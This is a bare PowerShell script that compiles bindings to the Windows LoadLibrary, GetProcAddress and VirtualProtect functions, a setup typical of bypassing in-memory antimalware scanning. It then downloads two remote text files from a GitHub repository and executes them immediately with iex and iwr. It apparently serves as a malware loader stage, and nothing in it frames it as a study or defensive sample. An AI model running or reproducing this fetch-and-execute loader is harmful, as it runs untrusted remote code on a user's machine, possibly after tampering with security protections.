# main.ps1
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

iex ( iwr https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/1.txt -UseBasicParsing );
iex ( iwr https://github.com/robertoaguilarfields-blip/my-proyecto/raw/refs/heads/main/2.txt -UseBasicParsing );
